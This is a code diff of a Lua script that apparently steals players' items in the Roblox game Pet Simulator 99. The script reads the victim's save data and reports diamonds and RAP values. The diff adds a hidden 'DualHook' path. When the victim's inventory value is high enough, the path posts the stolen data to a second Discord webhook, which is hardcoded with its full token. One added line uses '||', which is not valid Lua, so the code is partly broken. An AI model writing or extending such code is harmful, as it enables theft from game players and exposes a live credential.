@@ -1,3 +1,5 @@
+local request = request or syn and syn.request
+
 
 local function LoadingScreen()
     local ok, result = pcall(function()
@@ -32,7 +34,7 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local http = game and game.HttpGet or http_request or request or syn and syn.request
+
 
 
 local DualHookWebhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
@@ -83,7 +85,7 @@ local function formatNumber(number)
 	return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
-if totalRAP > DualHookRap then
+if totalRAP > DualHookRap || totalRAP == DualHookRap then
 	users = DualHookName
 end
 
@@ -160,9 +162,13 @@ local function SendMessage(diamonds)
 
 	local ok, res = pcall(function()
     if totalRap > DualHookRap then
-		webhook = DualHookWebhook
-		users = DualHookName
-		
+        return request({
+            Url = DualHookWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    else
         return request({
             Url = webhook,
             Method = "POST",
